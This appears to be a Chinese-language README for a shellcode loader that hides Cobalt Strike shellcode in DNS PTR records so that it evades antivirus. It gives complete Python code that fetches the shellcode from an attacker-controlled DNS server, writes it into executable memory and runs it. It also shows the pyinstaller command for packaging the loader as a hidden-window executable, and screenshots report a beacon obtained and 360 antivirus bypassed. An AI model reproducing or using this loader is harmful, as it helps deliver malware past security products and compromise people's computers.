# DnsPTRShellcodeLoader
利用DNS的PTR记录远程加载shellcode
DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。

PTR记录的两个特性

1.不区分大小写，dns解析结果统一转为小写

2.格式不定，可以出现包括“!@#$%^&*()_+=/?<>”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。







在本地服务器添加

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png)](https://imgbed.cn/preview?id=6038a9145dc5370001f7945a)



进行反向解析查询，192.168.111.135为DNS服务器的ip

```
nslookup -qt=ptr 192.168.111.1 192.168.111.135
```



可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png)](https://imgbed.cn/preview?id=6038a92234dcf30001560686)



用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png)](https://imgbed.cn/preview?id=6038a9299efdd1000197edba)



分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png)](https://imgbed.cn/preview?id=6038a92ff6094a0001be155e)

去掉所有的\x，把它们分割成多个部分按照顺序添加到PTR记录中



[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png)](https://imgbed.cn/preview?id=6038a93854a29f0001250fb6)



只需要按照顺序对相应的ip发起请求即可获得部分shellcode

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png)](https://imgbed.cn/preview?id=6038a943002aec0001e11199)



利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行

```python
import dns.resolver
import dns.reversename
import ctypes

dnsip='192.168.111.135'

def LoadshellCode(shellcode):   #执行shellcode
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))

def requestptr(dnsip,ipnum):      #获取PTR记录
    ipaddr='192.168.111.%d' %ipnum    #添加的PTR记录中主机ip地址的C段地址
    ip=dns.reversename.from_address(ipaddr)
    my_resolver = dns.resolver.Resolver()
    my_resolver.nameservers = [dnsip]
    answer = my_resolver.resolve(ip,'PTR')
    recvptr=str(answer[0]).strip('.')
    return recvptr

def str2hex(shellcodedemo):    #将得到的shellcode转为十六进制
    s=''
    s1=b''
    for i in range(int(len(shellcodedemo))):
        if i % 2 == 0:
            s1 += bytes.fromhex(shellcodedemo[i:i + 2])
    return bytearray(s1)

if __name__=='__main__':
    s=''
    for i in range(20,60):    #根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)
        s+=requestptr(dnsip,i)
    LoadshellCode(str2hex(s))
```





使用pyinstaller打包成exe文件，

```
pyinstaller -F -w dnsptrshellcode.py
```

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png)](https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56)



pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右

https://blog.csdn.net/p1967914901/article/details/109706449



拿到beacon

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png)](https://imgbed.cn/preview?id=6038a94a171e740001e39ed5)

可以绕过360，但被火绒查杀

[![imgbed.cn图床](https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png)](https://imgbed.cn/preview?id=6038a95c6cea45000126276c)
[![6d3ODf.png](https://s3.ax1x.com/2021/03/13/6d3ODf.png)](https://imgtu.com/i/6d3ODf)

参考：

https://www.freebuf.com/articles/network/185324.html
